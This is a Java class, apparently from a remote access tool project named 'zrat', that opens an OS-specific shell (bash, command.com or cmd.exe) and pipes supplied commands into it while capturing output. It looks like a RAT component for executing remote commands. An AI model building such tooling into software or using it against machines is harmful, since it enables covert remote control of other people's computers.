package com.zrat.server.controller;
import java.io.IOException;
import java.io.PrintWriter;
import java.util.Timer;


public class ExeShellCmd extends Thread {

	private final static boolean bDebug = false;
	public static final String WINDOWS_95 = "WINDOWS 95";
	public static final String WINDOWS_98 = "WINDOWS 98";
	public static final String WINDOWS = "Windows";
	public static final String LINUX = "LINUX";
	public static final String SOLARIS = "SOLARIS";
	public static final String AIX = "AIX";
	public static final String FREEBSD = "FREEBSD";
	public static final String IRIX = "IRIX";
	public static final String HP_UX = "HP-UX";
	public static final String MAC_OS = "MAC";
	private static Process aProc;
	private static PrintWriter shell;
	private static ExeShellCmd cmd;
	private static StreamGobbler errGrobbler;
	private static StreamGobbler outputGrobbler;
	private static Timer errtimer;
	private static Timer outtimer;

	/**
	 * execute shell command according to OS
	 * 
	 * @param sCmd
	 *            command list
	 * @return echomessage
	 */
	public String exec(String[] sCmd) {
		String strRet = "";
		try {
			strRet = "";

			
			for (int i = 0; i < sCmd.length; i++) {
				shell.println(sCmd[i]);
				shell.flush();
			}
		} catch (Exception ioex) {
			if (bDebug) {
				System.out.println("ExeShellCmd: io error");
			}
		}
		return strRet;
	}

	public String exec(String sCmd) {
		String[] sCmds = new String[1];
		sCmds[0] = sCmd;
		return exec(sCmds);
	}

	public static void init() {
		try {
			String sOS = System.getProperty("os.name").toUpperCase();
			Runtime aRT = Runtime.getRuntime(); // Runtime.getRuntime();
				
			if (sOS.equalsIgnoreCase(LINUX) || sOS.equalsIgnoreCase(FREEBSD) || sOS.equalsIgnoreCase(AIX)
					|| sOS.equalsIgnoreCase(IRIX) || sOS.equalsIgnoreCase(SOLARIS)
					|| sOS.equalsIgnoreCase(HP_UX) || sOS.startsWith(MAC_OS))
				aProc = aRT.exec("/bin/bash");
			else if(sOS.equalsIgnoreCase(WINDOWS_95) || sOS.equalsIgnoreCase(WINDOWS_98)){
				aProc = aRT.exec("command.com");
			}else if(sOS.startsWith(WINDOWS) || sOS.startsWith(WINDOWS.toLowerCase()) || sOS.startsWith(WINDOWS.toUpperCase())){
				aProc = aRT.exec("cmd.exe");
			}
			System.out.println("os is:"+sOS);
			if(aProc.getErrorStream() != null){
				errGrobbler = new StreamGobbler(aProc.getErrorStream(), "ERROR");
				errtimer = new Timer();
				errtimer.schedule(errGrobbler, 300);
			}
			outtimer = new Timer();

			outputGrobbler = new StreamGobbler(aProc.getInputStream(), "OUTPUT");
			outtimer.schedule(outputGrobbler, 300);
			shell = new PrintWriter(aProc.getOutputStream());
		} catch (IOException e) {
			e.printStackTrace();
		}

	}
	
	private ExeShellCmd() {

	}

	public static ExeShellCmd getInstance() {
		if (cmd == null) {
			cmd = new ExeShellCmd();
			init();
		}
		return cmd;
	}

}